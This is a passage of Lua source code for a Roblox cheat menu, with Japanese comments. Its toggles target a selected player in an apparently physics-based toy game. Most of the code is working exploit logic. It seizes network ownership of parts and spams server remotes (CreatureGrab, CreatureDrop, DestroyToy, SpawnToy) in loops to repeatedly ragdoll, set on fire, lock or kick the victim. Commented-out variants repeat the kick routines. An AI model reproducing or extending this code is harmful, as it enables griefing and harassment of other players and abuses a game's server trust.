                        part.CanCollide = false
                        part.Anchored = false
                        part.Massless = true
                        part.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0, 0, 0, 0)
                        claim(part)
                    end)
                end
            else
                break
            end
        end
    end

    -- クリーンアップ
    if pallet and pallet.Parent then
        pcall(function()
            RS.MenuToys.DestroyToy:FireServer(pallet)
            pallet:Destroy()
        end)
    end
    currentPallet = nil
end

-- === トグル（TarTabに追加） ===
TarTab:AddToggle({
    Name = "Pallet Ragdoll",
    Default = false,
    Save = true,
    Flag = "PalletRagdoll",
    Callback = function(Value)
        palletRagdollActive = Value

        if Value then
            if not selectedPlrName or selectedPlrName == "" then
                palletRagdollActive = false
                return
            end

            if palletRagdollTask then
                task.cancel(palletRagdollTask)
                palletRagdollTask = nil
            end

            palletRagdollTask = task.spawn(function()
                PalletRagdollFunction(selectedPlrName)
            end)
        else
            palletRagdollActive = false
            
            if palletRagdollTask then
                task.cancel(palletRagdollTask)
                palletRagdollTask = nil
            end

            -- クリーンアップ
            task.spawn(function()
                if currentPallet and currentPallet.Parent then
                    pcall(function()
                        local RS = game:GetService("ReplicatedStorage")
                        RS.MenuToys.DestroyToy:FireServer(currentPallet)
                        currentPallet:Destroy()
                    end)
                    currentPallet = nil
                end

                -- 残骸掃除
                local toysFolder = workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "SpawnedInToys")
                if toysFolder then
                    for _, p in ipairs(toysFolder:GetChildren()) do
                        if p.Name == "PalletLightBrown" then
                            pcall(function()
                                game:GetService("ReplicatedStorage").MenuToys.DestroyToy:FireServer(p)
                                p:Destroy()
                            end)
                        end
                    end
                end
            end)
        end
    end
})
    
    TarTab:AddToggle({
        Name = "Loop Banana Ragdoll",
        Default = false,
        Callback = function(Value)
            bool.LoopRagdoll = Value 
            if Value then 
                task.spawn(function()
                    local banana,SoundPart
                    etc.TargetPLR = Players:FindFirstChild(selectedPlrName)
                    if not etc.TargetPLR then Notify("Error","Target is not exists!") return end 
                    etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Left Leg")
                    local AlignPos
                    local AtachNew
                    while bool.LoopRagdoll and task.wait() do 
                        etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Left Leg")
                        if not etc.Root then continue end 
                        banana = inv:FindFirstChild("FoodBanana")
                        SoundPart = banana and banana:FindFirstChild("SoundPart")
                        if not SoundPart then 
                            for _,v in pairs(inv:GetChildren()) do 
                                if v.Name == "FoodBanana" then 
                                    DestroyToy:FireServer(v)
                                end 
                            end 
                            banana = SpawnToy("FoodBanana")
                            if not banana then continue end
                            SoundPart = FWD(banana,"SoundPart",5)
                            if not SoundPart then continue end
                            FWD(FWD(banana,"HoldPart"),"HoldItemRemoteFunction"):InvokeServer(banana,char)
                            RS.HoldEvents.Use:FireServer(banana)
                            while CFP(banana,"EdiblePart") do task.wait() end
                            RS.HoldEvents.Use:FireServer(banana)
                            FWD(FWD(banana,"HoldPart"),"DropItemRemoteFunction"):InvokeServer(banana,char:GetPivot() * CFrame.new(0,15,-10),Vector3.zero)
                            repeat 
                                task.wait(0.01)
                                SoundPart = banana and banana:FindFirstChild("SoundPart")
                                if not SoundPart then break end 
                                sno(SoundPart)
                            until not SoundPart or CFP(SoundPart,"PartOwner")
                            unsno(SoundPart)
                            local Atach = Instance.new("Attachment")
                            Atach.Parent = SoundPart
                            AlignPos = Instance.new("AlignPosition")
                            AlignPos.Responsiveness = 100
                            AlignPos.Parent = SoundPart
                            AlignPos.Attachment0 = Atach
                        end
                        for _,v in pairs(banana:GetChildren()) do 
                            if CFP(v,"PartOwner") and not CheckNetworkOwnerOnPart(v) then 
                                DestroyToy:FireServer(banana) 
                                banana = nil 
                                break 
                            end
                        end
                        if not banana then continue end 
                        AlignPos = SoundPart:FindFirstChild("AlignPosition")
                        if not AlignPos then DestroyToy:FireServer(banana) banana = nil continue end
                        AtachNew = etc.Root and etc.Root:FindFirstChild("LeftFootAttachment")
                        if not AtachNew then continue end 
                        AlignPos.Attachment1 = AtachNew
                    end 
                end)
            else 
                if banana then 
                    if AlignPos then 
                        AlignPos:Destroy()
                    end 
                    DestroyToy:FireServer(banana)
                end
            end 
        end    
    })

    -- TarTab:AddDropdown({
    --     Name = "Mode",
    --     Default = "[2Hand]",
    --     Options = {"[1Hand]","[2Hand]","[INPUTLAG]"},
    --     Callback = function(Value)
    --         int.selectedMode = Value
    --     end    
    -- })
    -- int.delay1 = 0.05
    -- int.delay2 = 0
    -- TarTab:AddSlider({
    --     Name = "Delay1",
    --     Min = 0,
    --     Max = 0.15,
    --     Default = 0.05,
    --     Color = Color3.fromRGB(0, 0, 255),
    --     Increment = 0.001,
    --     ValueName = "bananas",
    --     Callback = function(Value)
    --         int.delay1 = Value
    --     end    
    -- })


    -- TarTab:AddSlider({
    --     Name = "Delay2",
    --     Min = 0,
    --     Max = 0.15,
    --     Default = 0,
    --     Color = Color3.fromRGB(0, 0, 255),
    --     Increment = 0.001,
    --     ValueName = "bananas",
    --     Callback = function(Value)
    --         int.delay2 = Value
    --     end    
    -- })


    -- TarTab:AddToggle({
    --     Name = "LoopKick<font color=\"rgb(1, 250, 0)\"><b>[DELAY APPLY]</b></font>",
    --     Default = false,
    --     Callback = function(Value)
    --     bool.LoopKickWithDelay = Value 
    --     local blob = FindBlob()
    --     local CreatureGrab,CreatureDrop,CreatureRelease = blob and blob.BlobmanSeatAndOwnerScript.CreatureGrab,blob and blob.BlobmanSeatAndOwnerScript.CreatureDrop,blob and blob.BlobmanSeatAndOwnerScript.CreatureRelease
    --     local LeftDetector,RightDetector = blob and blob.LeftDetector,blob and blob.RightDetector
    --     local TargetPLR = selectedPlrName and  game.Players:FindFirstChild(selectedPlrName)
    --     local Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --     local Head = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("Head")
    --     local oldCF = char:GetPivot()
    --     if not blob or not TargetPLR then return end 
    --         if int.selectedMode == "[1Hand]" then  
    --             while bool.LoopKickWithDelay do 
    --                 Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                 if Root and TargetPLR.Character and TargetPLR.Character:FindFirstChild("Humanoid") and TargetPLR.Character.Humanoid.Health ~= 0 then 
    --                     CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                     task.wait(int.delay1)
    --                     CreatureDrop:FireServer(RightDetector.RightWeld,Root)
    --                     task.wait(int.delay2)
    --                 else 
    --                     if not game.Players:FindFirstChild(selectedPlrName) then 
    --                         break 
    --                     end
    --                     oldCF = char:GetPivot()
    --                     TargetPLR.CharacterAdded:Wait()
    --                     Root = FWD(TargetPLR.Character,"HumanoidRootPart",5)
    --                     Head = FWD(TargetPLR.Character,"Head",5)
    --                     if Root then  
    --                         RightDetector.RightWeld.Attachment0 = nil
    --                         repeat  
    --                             char:PivotTo(Root.CFrame * CFrame.new(0,10,0) * CFrame.new(Root.AssemblyLinearVelocity * 0.4))
    --                             CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                             task.wait(0.07)
    --                         until RightDetector.RightWeld.Attachment0 or not hum.SeatPart or not bool.LoopKickWithDelay
    --                         char:PivotTo(oldCF)
    --                         task.wait(0.45)
    --                         CreatureDrop:FireServer(RightDetector.RightWeld,Root)
    --                         task.wait(0.05)
    --                     end
    --                 end
    --             end
    --         elseif int.selectedMode == "[2Hand]" then  
    --             while bool.LoopKickWithDelay do 
    --                 Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                 if Root and TargetPLR.Character and TargetPLR.Character:FindFirstChild("Humanoid") and TargetPLR.Character.Humanoid.Health ~= 0 then 
    --                     CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                     task.wait(int.delay1)
    --                     CreatureDrop:FireServer(RightDetector.RightWeld,Root)
    --                     task.wait(int.delay2)
    --                     CreatureGrab:FireServer(LeftDetector,Root,LeftDetector.LeftWeld)
    --                     task.wait(int.delay1)
    --                     CreatureDrop:FireServer(LeftDetector.LeftWeld,Root)
    --                     task.wait(int.delay2)
    --                 else 
    --                     if not game.Players:FindFirstChild(selectedPlrName) then 
    --                         break 
    --                     end
    --                     oldCF = char:GetPivot()
    --                     TargetPLR.CharacterAdded:Wait()
    --                     Root = FWD(TargetPLR.Character,"HumanoidRootPart",5)
    --                     Head = FWD(TargetPLR.Character,"Head",5)
    --                     if Root then  
    --                         RightDetector.RightWeld.Attachment0 = nil
    --                         repeat  
    --                             char:PivotTo(Root.CFrame * CFrame.new(0,10,0) * CFrame.new(Root.AssemblyLinearVelocity * 0.4))
    --                             CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                             task.wait(0.07)
    --                         until RightDetector.RightWeld.Attachment0 or not hum.SeatPart or not bool.LoopKickWithDelay
    --                         char:PivotTo(oldCF)
    --                         task.wait(0.45)
    --                         CreatureDrop:FireServer(RightDetector.RightWeld,Root)
    --                         task.wait(0.05)
    --                     end
    --                 end
    --             end
    --         elseif int.selectedMode == "[INPUTLAG]" then 
    --             while bool.LoopKickWithDelay do
    --                 Root = TargetPLR and TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                 if Root and TargetPLR.Character and TargetPLR.Character:FindFirstChild("Humanoid") and TargetPLR.Character.Humanoid.Health ~= 0 then  
    --                     CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                     task.wait(int.delay1)
    --                     CreatureRelease:FireServer(RightDetector.RightWeld,Root)
    --                     RightDetector.RightWeld.Attachment0 = Root.RootAttachment
    --                     task.wait(int.delay2)
    --                 else 
    --                     if not game.Players:FindFirstChild(selectedPlrName) then 
    --                         break 
    --                     end
    --                     oldCF = char:GetPivot()
    --                     TargetPLR.CharacterAdded:Wait()
    --                     Root = FWD(TargetPLR.Character,"HumanoidRootPart",5)
    --                     Head = FWD(TargetPLR.Character,"Head",5)
    --                     if Root then  
    --                         RightDetector.RightWeld.Attachment0 = nil
    --                         repeat  
    --                             char:PivotTo(Root.CFrame * CFrame.new(0,10,0) * CFrame.new(Root.AssemblyLinearVelocity * 0.4))
    --                             CreatureGrab:FireServer(RightDetector,Root,RightDetector.RightWeld)
    --                             task.wait(0.07)
    --                         until RightDetector.RightWeld.Attachment0 or not hum.SeatPart or not bool.LoopKickWithDelay
    --                         char:PivotTo(oldCF)
    --                         task.wait(0.45)
    --                         CreatureDrop:FireServer(RightDetector.RightWeld,Root)
    --                         task.wait(0.05)
    --                     end
    --                 end
    --             end 
    --         end
    --     end    
    -- })

    Toggles["LockSettings"] = TarTab:AddDropdown({
        Name = "LOCK TP SETTING",
        Default = "[GRAB]",
        Options = {"[GRAB]","[WITHOUTGRAB]"},
        Save = true,
        Flag = "LockSettings",
        Callback = function(Value)
            int.selectedMode23 = Value
        end    
    })

TarTab:AddToggle({
    Name = "Loop Campfire <font color=\"rgb(255, 0, 0)\"><b>[FIRE]</b></font>",
    Default = false,
    Callback = function(Value)
        bool.LoopCampfire = Value 
        if Value then 
            task.spawn(function()
                local toy
                
                while bool.LoopCampfire and task.wait() do 
                    etc.TargetPLR = Players:FindFirstChild(selectedPlrName)
                    if not etc.TargetPLR then continue end
                    
                    local targetChar = etc.TargetPLR.Character
                    if not targetChar then continue end
                    
                    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then continue end

                    -- Campfireを確保
                    toy = inv:FindFirstChild("Campfire")
                    if not toy then 
                        -- 古いものを掃除
                        for _, v in pairs(inv:GetChildren()) do 
                            if v.Name == "Campfire" then 
                                DestroyToy:FireServer(v)
                            end 
                        end 
                        toy = SpawnToy("Campfire")
                        if not toy then continue end
                    end

                    local soundPart = toy:FindFirstChild("SoundPart") or FWD(toy, "SoundPart", 5)
                    if not soundPart then continue end

                    sno(soundPart)  -- ネットワーク所有権

                    -- === 飛ばして着火 ===
                    local startCFrame = soundPart.CFrame
                    local targetPos = targetRoot.Position + Vector3.new(0, 3, 0)

                    for i = 1, 20 do
                        if not (bool.LoopCampfire and targetRoot.Parent) then break end
                        
                        local t = i / 20
                        local currentPos = startCFrame.Position:Lerp(targetPos, t * 1.4)
                        
                        soundPart.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, math.rad(i * 15), 0)
                        
                        task.wait(0.028)
                    end

                    -- 着弾後に貼り付けてしっかり着火
                    soundPart.CFrame = targetRoot.CFrame * CFrame.new(0, 2.5, 0)
                    task.wait(0.25)

                    -- 所有権再確認
                    if toy.Parent then
                        for _, v in pairs(toy:GetChildren()) do 
                            if v:IsA("BasePart") then 
                                sno(v)
                            end
                        end
                    end
                end 
            end)
        else 
            -- オフ時に掃除
            for _, v in pairs(inv:GetChildren()) do 
                if v.Name == "Campfire" then 
                    DestroyToy:FireServer(v)
                end 
            end
        end 
    end    
})
    -- Snowball Ragdoll (TarTab用)
local snowballRagdollActive = false

TarTab:AddToggle({
    Name = "Loop Snowball Ragdoll <font color=\"rgb(0, 255, 255)\"><b>[SNOWBALL]</b></font>",
    Default = false,
    Callback = function(state)
        snowballRagdollActive = state

        if state then
            if not selectedPlrName or selectedPlrName == "" then
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Please select a target player first!",
                    Image = "warning",
                    Time = 5
                })
                snowballRagdollActive = false
                return
            end

            coroutine.wrap(function()
                while snowballRagdollActive do
                    local target = Players:FindFirstChild(selectedPlrName)
                    if target and target.Character then
                        local tChar = target.Character
                        local torso = tChar:FindFirstChild("UpperTorso") or tChar:FindFirstChild("Torso")
                        
                        if torso then
                            local SpawnRemote = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")

                            -- 雪玉を高速生成
                            task.spawn(function()
                                pcall(function()
                                    local offset = Vector3.new(
                                        math.random(-30, 30) / 100,
                                        math.random(-30, 30) / 100,
                                        math.random(-30, 30) / 100
                                    )
                                    local spawnCFrame = torso.CFrame * CFrame.new(offset)
                                    SpawnRemote:InvokeServer("BallSnowball", spawnCFrame, Vector3.zero)
                                end)
                            end)

                            -- 生成された雪玉を貼り付け
                            local folder = Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
                            if folder then
                                for _, snowball in pairs(folder:GetChildren()) do
                                    if snowball.Name == "BallSnowball" then
                                        local part = snowball.PrimaryPart or snowball:FindFirstChildWhichIsA("BasePart")
                                        if part then
                                            local offset = Vector3.new(
                                                math.random(-30, 30) / 100,
                                                math.random(-30, 30) / 100,
                                                math.random(-30, 30) / 100
                                            )
                                            local prediction = torso.AssemblyLinearVelocity * 0.03
                                            part.CFrame = (torso.CFrame + prediction) * CFrame.new(offset)
                                            part.AssemblyLinearVelocity = Vector3.zero
                                            part.AssemblyAngularVelocity = Vector3.zero
                                        end
                                    end
                                end
                            end
                        end
                    end
                    task.wait()
                end
            end)()
        else
            -- オフ時のクリーンアップ
            pcall(function()
                local folder = Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
                if folder then
                    for _, snowball in pairs(folder:GetChildren()) do
                        if snowball.Name == "BallSnowball" then
                            local part = snowball.PrimaryPart or snowball:FindFirstChildWhichIsA("BasePart")
                            if part then
                                part.CFrame = CFrame.new(0, -200, 0)
                            end
                        end
                    end
                end
            end)
        end
    end
})
    
    TarTab:AddToggle({
        Name = "LoopBLOB<font color=\"rgb(255, 0, 255)\"><b>[LOCK]</b></font>",
        Default = false,
        Callback = function(Value)
            bool.LoopKickMax2 = Value 
            if bool.LoopKickMax2 then
                local blob = FindBlob()
                local CreatureGrab,CreatureDrop,CreatureRelease = blob and blob.BlobmanSeatAndOwnerScript.CreatureGrab,blob and blob.BlobmanSeatAndOwnerScript.CreatureDrop,blob and blob.BlobmanSeatAndOwnerScript.CreatureRelease
                local LeftDetector,RightDetector = blob and blob.LeftDetector,blob and blob.RightDetector
                etc.TargetPLR = selectedPlrName and  game.Players:FindFirstChild(selectedPlrName)
                etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
                local oldCF = char:GetPivot()
                if not etc.Root or not etc.TargetPLR or not blob then return end
                local BodyPos = etc.Root:FindFirstChild("KickBodyPos")
                if BodyPos then  
                    for _,v in pairs(etc.Root:GetChildren()) do 
                        if v.Name == "KickBodyPos" then  
                            v:Destroy()
                        end
                    end
                end 
                BodyPos = Instance.new("BodyPosition")
                BodyPos.Name = "KickBodyPos"
                BodyPos.MaxForce = Vector3.new(Huge())
                BodyPos.Position = blob.LeftDetector.Position + Vector3.new(0,0,-5)
                BodyPos.Parent = etc.Root
                BodyPos.P = 45000
                BodyPos.D = 500
                if int.selectedMode23 == "[GRAB]" then 
                    repeat
                        task.wait(0.01)
                        if etc.TargetPLR.InPlot.Value then continue end 
                        etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                        if not etc.Root then  
                            break  
                        end
                        char:PivotTo(etc.Root.CFrame * CFrame.new(etc.Root.AssemblyLinearVelocity * 0.1))
                        sno(etc.Root)
                    until not (etc.Head or etc.Root) or (etc.Head:FindFirstChild("PartOwner") and etc.Head:FindFirstChild("PartOwner").Value == plr.Name) or not bool.LoopKickMax2 or not hum.SeatPart
                    char:PivotTo(oldCF)
                    if etc.Head and etc.Head:FindFirstChild("PartOwner") then 
                        task.defer(function()
                            for i = 1,10 do 
                                etc["Root"].CFrame = oldCF * CFrame.new(0,0,-5)
                                blob.HumanoidCreature.PlatformStand = false
                                blob.HumanoidCreature:ChangeState(Enum.HumanoidStateType.GettingUp)
                            end 
                        end)
                    end
                end
                if (etc.Head and etc.Root) and (CheckForPartOwner(etc.Head) or int.selectedMode23 ~= "[GRAB]") then
                    etc["Root"].CFrame = blob.LeftDetector.CFrame * CFrame.new(0,0,-5)
                    task.defer(function()
                        ChangeCollision(etc.TargetPLR.Character,false)
                        StopAllVelocity(blob)
                        StopAllVelocity(etc.TargetPLR.Character)
                        BodyPos:Destroy()
                    end)
                    cons["LOCKTHREAD"] = RunService.Stepped:Connect(function()
                        etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                        if not etc.Root then  
                            return 
                        end
                        CreatureGrab:FireServer(LeftDetector,etc.Root,LeftDetector.LeftWeld)
                        RunService.Heartbeat:Wait()
                        CreatureRelease:FireServer(LeftDetector.LeftWeld,etc.Root)
                        LeftDetector.LeftWeld.Attachment0 = etc["Root"].RootAttachment
                    end)
                end
            else  
                cons:disc("LOCKTHREAD")
                if etc.Root then    
                    if etc.Root:FindFirstChild("KickBodyPos") then   
                        etc.Root:FindFirstChild("KickBodyPos"):Destroy()
                    end
                end
            end
        end    
    })

    TarTab:AddToggle({
        Name = "Use SNO to kick ?",
        Default = false,
        Callback = function(Value)
            bool.UseSNO = Value 
        end    
    })

    -- int.CounterOfSno = 0
    -- TarTab:AddToggle({
    --     Name = "LoopKick<font color=\"rgb(255, 0, 0)\"><b>[INIT + PINGY]</b></font>",
    --     Default = false,
    --     Callback = function(Value)
    --         bool.LoopKickMax1 = Value 
    --         if bool.LoopKickMax1 then
    --             cons["LoopKick"] = task.spawn(function()
    --                 local blob = FindBlob()
    --                 local CreatureGrab,CreatureDrop,CreatureRelease = blob and blob.BlobmanSeatAndOwnerScript.CreatureGrab,blob and blob.BlobmanSeatAndOwnerScript.CreatureDrop,blob and blob.BlobmanSeatAndOwnerScript.CreatureRelease
    --                 local LeftDetector,RightDetector = blob and blob.LeftDetector,blob and blob.RightDetector
    --                 etc.TargetPLR = selectedPlrName and  game.Players:FindFirstChild(selectedPlrName)
    --                 etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                 etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
    --                 etc.Hum = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Humanoid")
    --                 local oldCF = hrp.CFrame
    --                 if not etc.Root or not etc.TargetPLR or not blob then return end
    --                 local BodyPos = etc.Root:FindFirstChild("KickBodyPos1")
    --                 if BodyPos then  
    --                     for _,v in pairs(etc.Root:GetChildren()) do 
    --                         if v.Name == "KickBodyPos1" then  
    --                             v:Destroy()
    --                         end
    --                     end
    --                 end 
    --                 BodyPos = Instance.new("BodyPosition")
    --                 BodyPos.Name = "KickBodyPos1"
    --                 BodyPos.MaxForce = Vector3.new(Huge())
    --                 BodyPos.Position = oldCF.Position + Vector3.new(0,25,0)
    --                 BodyPos.Parent = etc.Root
    --                 BodyPos.P = 45000
    --                 BodyPos.D = 500
    --                 repeat
    --                     task.wait(0.01)
    --                     etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                     etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
    --                     if etc["TargetPLR"].InPlot.Value then continue end 
    --                     if not etc.Root then  
    --                         break  
    --                     end
    --                     blob:PivotTo(etc.Root.CFrame * CFrame.new(etc.Root.AssemblyLinearVelocity * 0.1))
    --                     sno(etc.Root)
    --                 until (not etc.Root or not etc.Head) or CheckForPartOwner(etc.Head) or not bool.LoopKickMax1 or not hum.SeatPart
    --                 char:PivotTo(oldCF)
    --                 if (etc.Root and etc.Head) and CheckForPartOwner(etc.Head) then
    --                     CreatureGrab:FireServer(RightDetector,etc.Root,RightDetector.RightWeld)
    --                     task.defer(function()
    --                         for _,v in pairs(etc["TargetPLR"].Character:GetChildren()) do 
    --                             if v:IsA("BasePart") then 
    --                                 v.CFrame = oldCF * CFrame.new(0,20,0)
    --                             end
    --                             blob.HumanoidCreature.PlatformStand = false
    --                             blob.HumanoidCreature:ChangeState(Enum.HumanoidStateType.GettingUp)
    --                         end
    --                         StopAllVelocity(char)
    --                         StopAllVelocity(blob)
    --                         StopAllVelocity(etc.TargetPLR.Character)
    --                     end)
    --                     StopVelocityF()
    --                     unsno(etc["Root"])
    --                     while RunService.Heartbeat:Wait() do 
    --                         etc.TargetPLR = Players:FindFirstChild(selectedPlrName)
    --                         etc.Root = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                         etc.Hum = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("Humanoid")
    --                         if not etc.Root or not etc.Hum or etc.Hum.Health == 0 then 
    --                             etc["TargetPLR"].CharacterAdded:Wait()
    --                             etc.Root = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                             etc.Hum = etc.TargetPLR and etc.TargetPLR.Character:FindFirstChild("Humanoid")
    --                             oldCF = char:GetPivot()
    --                                 BodyPos = Instance.new("BodyPosition")
    --                                 BodyPos.Name = "KickBodyPos1"
    --                                 BodyPos.MaxForce = Vector3.new(Huge())
    --                                 BodyPos.Position = oldCF.Position + Vector3.new(0,25,0)
    --                                 BodyPos.Parent = etc.Root
    --                                 BodyPos.P = 45000
    --                                 BodyPos.D = 500
    --                             repeat
    --                                 task.wait(0.01)
    --                                 etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
    --                                 etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
    --                                 if etc["TargetPLR"].InPlot.Value then continue end 
    --                                 if not etc.Root then break end
    --                                 blob:PivotTo(etc.Root.CFrame * CFrame.new(etc.Root.AssemblyLinearVelocity * 0.1))
    --                                 sno(etc.Root)
    --                             until (not etc.Root or not etc.Head) or CheckForPartOwner(etc.Head) or not bool.LoopKickMax1 or not hum.SeatPart
    --                             char:PivotTo(oldCF)
    --                             task.defer(function()
    --                                 StopAllVelocity(blob)
    --                                 StopAllVelocity(etc.TargetPLR.Character)
    --                                 for _,v in pairs(etc["TargetPLR"].Character:GetChildren()) do 
    --                                     if v:IsA("BasePart") then 
    --                                         v.CFrame = oldCF * CFrame.new(0,20,0)
    --                                     end
    --                                     blob.HumanoidCreature.PlatformStand = false
    --                                     blob.HumanoidCreature:ChangeState(Enum.HumanoidStateType.GettingUp)
    --                                 end 
    --                             end)
    --                         end
    --                         CreatureGrab:FireServer(RightDetector,etc.Root,RightDetector.RightWeld)
    --                         RunService.Heartbeat:Wait()
    --                         CreatureDrop:FireServer(RightDetector.RightWeld,etc.Root) 
    --                         if bool.UseSNO then
    --                             int.CounterOfSno += 1  
    --                             if int.CounterOfSno >= 100 then  
    --                                 int.CounterOfSno = 0 
    --                                 sno(etc.Root)
    --                                 unsno(etc.Root)
    --                             end
    --                         end
    --                     end
    --                 end
    --             end)
    --         else 
    --             cons:cancel("LoopKick")
    --             if etc.Root and etc.Root:FindFirstChild("KickBodyPos1") then   
    --                 etc.Root:FindFirstChild("KickBodyPos1"):Destroy()
    --             end
    --         end
    --     end    
    -- })
    TarTab:AddToggle({
    Name = "LoopKick<font color=\"rgb(255, 0, 0)\"><b>[INIT + PINGY]</b></font>",
    Default = false,
    Callback = function(Value)
        bool.LoopKickMax1 = Value 
        if Value then
            local blob = FindBlob()
            local CreatureGrab,CreatureDrop,CreatureRelease = blob and blob.BlobmanSeatAndOwnerScript.CreatureGrab,blob and blob.BlobmanSeatAndOwnerScript.CreatureDrop,blob and blob.BlobmanSeatAndOwnerScript.CreatureRelease
            local LeftDetector,RightDetector = blob and blob.LeftDetector,blob and blob.RightDetector
            etc.TargetPLR = selectedPlrName and  game.Players:FindFirstChild(selectedPlrName)
            etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
            etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
            etc.Hum = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Humanoid")
            local oldCF = hrp.CFrame
            local function CREATEBODYPOS(Parent)
                for _,v in pairs(Parent:GetChildren()) do 
                    if v.Name == "KickBodyPos1" then  
                        v:Destroy()
                    end
                end
                BodyPos = Instance.new("BodyPosition")
                BodyPos.Name = "KickBodyPos1"
                BodyPos.MaxForce = Vector3.new(Huge())
                BodyPos.Position = oldCF.Position + Vector3.new(0,25,0)
                BodyPos.Parent = Parent
                BodyPos.P = 45000
                BodyPos.D = 500
            end
            local IsPreparing = true
            local IsFirst = true
            if not etc.Root or not etc.TargetPLR or not blob then return end
            cons["LoopKickINIT"] = task.spawn(function()
                while RunService.Heartbeat:Wait() do 
                    etc.TargetPLR = selectedPlrName and game.Players:FindFirstChild(selectedPlrName)
                    if not etc.TargetPLR then 
                        IsPreparing = true 
                        continue 
                    end
                    etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                    etc.Head = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
                    etc.Hum = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Humanoid")
                    if not etc.Root or not etc.Hum or etc.Hum.Health == 0 or IsFirst then 
                        IsPreparing = true 
                        if not IsFirst then
                            etc["TargetPLR"].CharacterAdded:Wait()
                        end
                        IsFirst = false
                        etc.Root = etc.TargetPLR and FWD(etc.TargetPLR.Character,"HumanoidRootPart",5)
                        etc.Hum = etc.TargetPLR and FWD(etc.TargetPLR.Character,"Humanoid",5)
                        oldCF = char:GetPivot()
                        CREATEBODYPOS(etc.Root)
                        repeat
                            task.wait(0.01)
                            etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                            etc.Head = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Head")
                            if etc["TargetPLR"].InPlot.Value then continue end 
                            if not etc.Root then break end
                            blob:PivotTo(etc.Root.CFrame * CFrame.new(etc.Root.AssemblyLinearVelocity * 0.1))
                            sno(etc.Root)
                        until (not etc.Root or not etc.Head) or CheckForPartOwner(etc.Head) or not bool.LoopKickMax1 or not hum.SeatPart
                        char:PivotTo(oldCF)
                        IsPreparing = false
                        StopAllVelocity(blob)
                        StopAllVelocity(etc.TargetPLR.Character)
                        for _,v in pairs(etc["TargetPLR"].Character:GetChildren()) do 
                            if v:IsA("BasePart") then 
                                v.CFrame = oldCF * CFrame.new(0,20,0)
                            end
                            blob.HumanoidCreature.PlatformStand = false
                            blob.HumanoidCreature:ChangeState(Enum.HumanoidStateType.GettingUp)
                        end 
                    end
                end
            end)
            cons["LoopKickMain"] = RunService.Heartbeat:Connect(function()
                if not bool.LoopKickMax1 or IsPreparing then return end 
                etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                if not etc.Root then return end
                CreatureGrab:FireServer(RightDetector,etc.Root,RightDetector.RightWeld)
                RunService.Heartbeat:Wait()
                CreatureDrop:FireServer(RightDetector.RightWeld,etc.Root) 
                if bool.UseSNO then
                    int.CounterOfSno += 1  
                    if int.CounterOfSno >= 100 then  
                        int.CounterOfSno = 0 
                        sno(etc.Root)
                        unsno(etc.Root)
                    end
                end
            end)
        else
            cons:cancel("LoopKickINIT")
            cons:disc("LoopKickMain")
            if etc.Root and etc.Root:FindFirstChild("KickBodyPos1") then   
                etc.Root:FindFirstChild("KickBodyPos1"):Destroy()
            end
        end
    end
    })
    local function getHRP(char)
        return char and char:FindFirstChild("HumanoidRootPart")
    end
    local function ForceDeathNotG(hum)  
